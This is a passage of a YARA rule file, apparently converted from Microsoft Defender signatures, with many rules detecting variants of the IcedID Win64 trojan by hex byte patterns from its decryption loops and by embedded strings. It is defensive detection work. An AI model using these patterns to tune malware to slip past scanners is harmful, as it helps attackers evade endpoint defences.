        $x_1_1 = {49 83 c0 01 41 f7 ec d1 fa 8b c2 c1 e8 1f 03 d0 49 63 c4 41 83 c4 ?? 48 63 ca 48 6b c9 ?? 48 03 c8 48 8b 44 24 ?? 42 0f b6 8c 31 ?? ?? ?? ?? 41 32 4c 00 ?? 43 88 4c 18 ?? 44 3b 64 24 ?? 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ADF_2147846932_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ADF!MTB"
        threat_id = "2147846932"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 89 84 24 ?? ?? ?? ?? 3a d2 74 ?? b9 ?? ?? ?? ?? 48 f7 f1 66 3b f6 74 ?? 89 84 24 ?? ?? ?? ?? 48 ?? ?? ?? ?? 66 3b c9 74 ?? 8b 40 ?? 48 ?? ?? ?? ?? 66 3b c9 74 ?? 8b 4c 24 ?? 33 c8 66 3b ed 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_KNW_2147847625_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.KNW!MTB"
        threat_id = "2147847625"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {48 98 48 8b 8c 24 a0 01 00 00 0f b6 04 01 8b 4c 24 48 48 63 c9 48 8b 94 24 c8 01 00 00 48 33 04 ca 8b 8c 24 b0 01 00 00 48 63 c9 48 8b 94 24 e0 00 00 00 0f b7 0c 4a 33 d2 48 f7 f1 48 8b 4c 24 40 0f b7 09 83 c1 05 48 63 c9 48 8b 94 24 e8 00 00 00 89 04 8a e9 ae fd ff ff}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_RDE_2147851404_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.RDE!MTB"
        threat_id = "2147851404"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {41 8b 4a 30 41 03 cb 81 f1 0e 16 0a 00 0f af c1}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_RDD_2147851684_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.RDD!MTB"
        threat_id = "2147851684"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "vcab" ascii //weight: 1
        $x_1_2 = "theora_clear" ascii //weight: 1
        $x_1_3 = "th_info_init" ascii //weight: 1
        $x_1_4 = "th_comment_query" ascii //weight: 1
        $x_1_5 = "th_granule_frame" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_YAA_2147888773_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.YAA!MTB"
        threat_id = "2147888773"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {89 c8 41 f7 eb c1 fa 03 89 c8 c1 f8 1f 29 c2 44 8d 04 52 43 8d 04 c0 41 89 c8 41 29 c0 4d 63 c0 4c 8b 0d ?? ?? ?? ?? 47 0f b6 04 01 44 32 44 0c 20 45 88 04 0a 48 83 c1 01 48 81 f9}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_YAB_2147891610_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.YAB!MTB"
        threat_id = "2147891610"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b c2 48 98 48 8b ?? 24 [0-4] 0f b6 04 01 8b 4c 24 04 33 c8 8b c1 48 63 0c 24 48 8b ?? 24 [0-4] 88 04 0a}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SUB_2147892866_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SUB!MTB"
        threat_id = "2147892866"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 8b c3 41 ff c3 49 f7 e0 48 c1 ea 02 48 6b c2 16 4c 2b c0 42 8a 44 85 ?? 41 30 02 49 ff c2 4d 63 c3 4c 3b c7 72}  //weight: 1, accuracy: Low
        $x_1_2 = {48 8b c3 ff c1 49 f7 e0 48 c1 ea 02 48 6b c2 16 4c 2b c0 42 8a 44 85 ?? 41 30 02 49 ff c2 4c 63 c1 4c 3b c7 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_RG_2147892874_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.RG!MTB"
        threat_id = "2147892874"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "qzzspddlaigqan.dll" ascii //weight: 1
        $x_1_2 = {61 6d 6a 75 76 64 6e 69 67 72 6d 75 66 77 6a 77 67 00 61 71 62 73 74 69 76 69 67 66 77}  //weight: 1, accuracy: High
        $x_1_3 = "fbowcgdodwksbxja" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SUD_2147892936_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SUD!MTB"
        threat_id = "2147892936"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 8b c3 41 ff c3 49 f7 e1 48 c1 ea 04 48 6b c2 ?? 4c 2b c8 42 8a 44 8d b7 41 30 02 49 ff c2 4d 63 cb 4c 3b cf 72}  //weight: 1, accuracy: Low
        $x_1_2 = {48 8b c3 ff c1 49 f7 e1 48 c1 ea 04 48 6b c2 ?? 4c 2b c8 42 8a 44 8d 07 41 30 02 49 ff c2 4c 63 c9 4c 3b cf 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_TYA_2147893044_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.TYA!MTB"
        threat_id = "2147893044"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 ff c3 48 8b c3 49 f7 e1 48 c1 ea ?? 48 8d 04 92 48 03 c0 4c 2b c8 42 8a 44 8c ?? 41 30 02 49 ff c2 4d 63 cb 4c 3b cf 72}  //weight: 1, accuracy: Low
        $x_1_2 = {ff c1 48 8b c3 49 f7 e1 48 c1 ea ?? 48 8d 04 92 48 03 c0 4c 2b c8 42 8a 44 8c ?? 41 30 02 49 ff c2 4c 63 c9 4c 3b cf 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_NIA_2147893162_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.NIA!MTB"
        threat_id = "2147893162"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 8b c3 41 ff c3 49 f7 e0 49 8b c0 48 2b c2 48 d1 e8 48 ?? c2 48 c1 e8 03 48 6b c0 0e 4c 2b c0 42 8a 44 85 e7 41 30 02 49 ff c2 4d 63 c3 4c 3b c7 72}  //weight: 1, accuracy: Low
        $x_1_2 = {48 8b c3 ff c1 49 f7 e0 49 8b c0 48 2b c2 48 d1 e8 48 ?? c2 48 c1 e8 03 48 6b c0 0e 4c 2b c0 42 8a 44 85 1f 41 30 02 49 ff c2 4c 63 c1 4c 3b c7 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_NIC_2147893163_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.NIC!MTB"
        threat_id = "2147893163"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 ff c3 48 8b c3 49 f7 e0 48 c1 ea 04 48 8d 04 52 48 c1 e0 ?? 4c 2b c0 42 8a 44 85 97 41 30 02 49 ff c2 4d 63 c3 4c 3b c7 72}  //weight: 1, accuracy: Low
        $x_1_2 = {ff c1 48 8b c3 49 f7 e0 48 c1 ea 04 48 8d 04 52 48 c1 e0 ?? 4c 2b c0 42 8a 44 85 f7 41 30 02 49 ff c2 4c 63 c1 4c 3b c7 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EI_2147893212_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EI!MTB"
        threat_id = "2147893212"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8b c0 0f b6 84 04 60 01 00 00 3a ff}  //weight: 1, accuracy: High
        $x_1_2 = {8b 8c 24 8c 00 00 00 33 c8 66 3b d2}  //weight: 1, accuracy: High
        $x_1_3 = {8b c1 48 63 4c 24 3c}  //weight: 1, accuracy: High
        $x_1_4 = {48 8b 54 24 70 88 04 0a}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_RHY_2147893298_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.RHY!MTB"
        threat_id = "2147893298"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {45 8b 0c 02 49 83 c2 04 8b 81 c4 00 00 00 35 a8 a5 f3 00 09 81 0c 01 00 00 48 8b 15 1a d4 04 00 8b 8a ?? ?? ?? ?? 8b 82 48 01 00 00 81 f1 a9 a5 f3 00 0f af c1 89 82 48 01 00 00 48 63 0d 70 d4 04 00 44 0f af 0d 64 d4 04 00 48 8b 05 a1 d4 04 00 41 8b d1 c1 ea 18 88 14 01 41 8b d1 44 8b 05 4e d4 04 00 48 8b 0d cf d3 04 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_RHZ_2147893303_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.RHZ!MTB"
        threat_id = "2147893303"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 8b c3 41 ff c3 49 f7 e0 48 c1 ea 02 48 6b c2 ?? 4c 2b c0 42 8a 44 84 20 41 30 02 49 ff c2 4d 63 c3 4c 3b c7 72}  //weight: 1, accuracy: Low
        $x_1_2 = {48 8b c3 ff c1 49 f7 e0 48 c1 ea 02 48 6b c2 ?? 4c 2b c0 42 8a 44 84 58 41 30 02 49 ff c2 4c 63 c1 4c 3b c7 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_TRE_2147893403_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.TRE!MTB"
        threat_id = "2147893403"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {ff c1 c1 ea 08 0f af c1 49 63 49 68 41 89 81 ?? ?? ?? ?? 49 8b 81 a8 00 00 00 88 14 01 41 ff 41 68 49 63 49 68 48 8b 05 b1 73 05 00 44 88 04 01 b8 01 00 00 00 41 2b 81 ?? ?? ?? ?? 41 ff 41 68 2b 05 07 73 05 00 48 8b 0d d8 72 05 00 01 41 34 41 8b 81 c4 00 00 00 35 a8 a5 f3 00 29 05 53 73 05 00 49 81 fe 00 27 02 00 0f 8c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_TAC_2147893426_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.TAC!MTB"
        threat_id = "2147893426"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {05 10 d9 e8 ff 09 81 ?? ?? ?? ?? 48 8b 05 b1 d4 04 00 48 8b 0d fa d3 04 00 45 8b 0c 02 49 83 c2 04 8b 81 ?? ?? ?? ?? 35 a8 a5 f3 00 09 81 0c 01 00 00 48 8b 15 da d3 04 00 8b 8a c4 00 00 00 8b 82 48 01 00 00 81 f1 a9 a5 f3 00 0f af c1 89 82 48 01 00 00 48 63 0d 30 d4 04 00 44 0f af 0d 24 d4 04 00 48 8b 05 61 d4 04 00 41 8b d1 c1 ea 18 88 14 01 41 8b d1 44 8b 05}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_TAW_2147893484_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.TAW!MTB"
        threat_id = "2147893484"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {45 8b 0c 02 49 83 c2 04 8b 81 ?? ?? ?? ?? 35 a8 a5 f3 00 09 81 0c 01 00 00 48 8b 15 ba d3 04 00 8b 8a c4 00 00 00 8b 82 48 01 00 00 81 f1 a9 a5 f3 00 0f af c1 89 82 48 01 00 00 48 63 0d 10 d4 04 00 44 0f af 0d 04 d4 04 00 48 8b 05 ?? ?? ?? ?? 41 8b d1 c1 ea 18 88 14 01 41 8b d1 44 8b 05 ee d3 04 00 48 8b 0d 6f d3 04 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_WAD_2147893485_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.WAD!MTB"
        threat_id = "2147893485"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {49 63 c8 48 8b c3 48 f7 e1 41 ff c0 48 c1 ea ?? 48 6b c2 16 48 2b c8 8a 44 8d 97 41 30 01 49 ff c1 44 3b c7 72}  //weight: 1, accuracy: Low
        $x_1_2 = {49 63 ca 48 8b c3 48 f7 e1 41 ff c2 48 c1 ea ?? 48 6b c2 16 48 2b c8 8a 44 8d f7 41 30 00 49 ff c0 44 3b d7 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_JHN_2147894238_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.JHN!MTB"
        threat_id = "2147894238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {49 63 c8 48 8b c3 48 f7 e1 41 ff c0 48 c1 ea ?? 48 8d 04 92 48 03 c0 48 2b c8 8a 44 8c 20 41 30 01 49 ff c1 44 3b c7 72}  //weight: 1, accuracy: Low
        $x_1_2 = {49 63 ca 48 8b c3 48 f7 e1 41 ff c2 48 c1 ea ?? 48 8d 04 92 48 03 c0 48 2b c8 8a 44 8c 48 41 30 00 49 ff c0 44 3b d7 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_HAT_2147894546_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.HAT!MTB"
        threat_id = "2147894546"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {41 8b c3 41 ff c3 83 e0 0f 8a 44 84 20 30 02 48 ff c2 45 3b d8 72}  //weight: 1, accuracy: High
        $x_1_2 = {41 8b c2 41 ff c2 83 e0 0f 8a 44 84 60 30 02 48 ff c2 45 3b d0 72}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EJ_2147894612_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EJ!MTB"
        threat_id = "2147894612"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8b c0 0f b6 84 04}  //weight: 1, accuracy: High
        $x_1_2 = {8b 8c 24 8c 00 00 00 33 c8 3a c0}  //weight: 1, accuracy: High
        $x_1_3 = {8b c1 48 63 4c 24 3c}  //weight: 1, accuracy: High
        $x_1_4 = {48 8b 54 24 70 88 04 0a}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_HAN_2147894632_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.HAN!MTB"
        threat_id = "2147894632"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {89 c8 41 89 c9 41 f7 eb 89 c8 c1 f8 1f 01 ca c1 fa 05 29 c2 b8 3e 00 00 00 0f af d0 41 29 d1 4d 63 c9 47 0f b6 04 08 44 32 04 0b 45 88 04 0a 48 83 c1 01 48 81 f9 9d 0b 00 00 75}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_FK_2147896356_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.FK!MTB"
        threat_id = "2147896356"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {49 63 c9 48 b8 ?? ?? ?? ?? ?? ?? ?? ?? 45 03 cc 48 f7 e1 48 c1 ea ?? 48 8d 04 d2 48 03 c0 48 2b c8 48 2b cb 8a 44 0c ?? 43 32 04 13 41 88 02 4d 03 d4 45 3b cd}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_FK_2147896356_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.FK!MTB"
        threat_id = "2147896356"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {8a 44 94 40 42 02 44 84 ?? 43 32 04 33 42 8b 4c 84 ?? 41 88 04 1b 83 e1 07 8b 44 94 ?? 49 ff c3 d3 c8 ff c0 89 44 94 40 8b c8 42 8b 44 84}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_YY_2147897359_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.YY!MTB"
        threat_id = "2147897359"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "101"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {f1 d5 00 fa 4c 62 cc f4 0f 0b}  //weight: 1, accuracy: High
        $x_100_2 = {0f b7 44 24 24 66 ff c0 66 89 44 24 24 0f b7 44 24 24 0f b7 4c 24 28 3b c1 7d ?? 0f b7 44 24 24 48 8b 4c 24 40 8a 04 01 88 44 24 20 8b 4c 24 2c e8 ?? ?? ?? ?? 89 44 24 2c 0f b6 44 24 20 0f b6 4c 24 2c 33 c1 0f b7 4c 24 24 48 8b 54 24 48 88 04 0a}  //weight: 100, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_TA_2147897655_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.TA!MTB"
        threat_id = "2147897655"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {33 c1 48 63 4c 24 ?? 66 3b ff}  //weight: 1, accuracy: Low
        $x_1_2 = {0f b6 84 04 ?? ?? ?? ?? 8b 4c 24 ?? e9 ?? ?? ?? ?? ff c0 99 66 3b f6 74}  //weight: 1, accuracy: Low
        $x_1_3 = {8b c2 89 44 24 ?? 3a f6 74 ?? f7 7c 24 ?? 8b c2 3a c9 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_HW_2147899927_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.HW!MTB"
        threat_id = "2147899927"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {89 c2 30 da 84 c0 b8 ?? ?? ?? ?? 41 0f 45 c6 84 db 41 0f 44 c1 84 d2 41 0f 45 c6 e9}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_PACY_2147900628_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.PACY!MTB"
        threat_id = "2147900628"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {8a 11 88 54 24 21 80 44 24 21 cc c0 64 24 21 04 8a 54 24 21 88 54 24 22 8a 51 01 88 54 24 21 80 44 24 21 c9 8a 54 24 21 08 54 24 22 8a 54 24 23 30 54 24 22 fe 44 24 23 8a 54 24 22 88 10}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SW_2147902112_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SW!MTB"
        threat_id = "2147902112"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {ff c0 66 3b db 74 ?? 8b c2 89 44 24 ?? 3a db 74 ?? 8b 4c 24 ?? 03 c8 3a ff 74}  //weight: 1, accuracy: Low
        $x_1_2 = {8b c2 89 44 24 ?? 3a db 74 ?? 0f b6 8c 0c ?? ?? ?? ?? 33 c1 e9}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SZA_2147902114_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SZA!MTB"
        threat_id = "2147902114"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {33 c8 8b c1 66 ?? ?? 74 ?? 48 ?? ?? b9 ?? ?? ?? ?? 48 ?? ?? 3a c9 74 2f 00 3a c0 74 ?? 89 44 24 ?? 48 ?? ?? ?? ?? 33 d2 66 ?? ?? 74 ?? 8b 4c 24}  //weight: 1, accuracy: Low
        $x_1_2 = "Init" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_XZ_2147902475_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.XZ!MTB"
        threat_id = "2147902475"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {48 f7 e1 48 8b c1 ff c3 48 2b c2 48 d1 e8 48 03 c2 48 c1 e8 04 48 6b c0 1c 48 2b c8 8a 4c 0d e0 43 32 0c 02 41 88 08 49 ff c0}  //weight: 5, accuracy: High
        $x_5_2 = {65 48 8b 0c 25 60 00 00 00 8b 91 bc 00 00 00 c1 ea 08 f6 c2 01 75 04}  //weight: 5, accuracy: High
        $x_1_3 = "bhuf" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_LD_2147904375_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.LD!MTB"
        threat_id = "2147904375"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
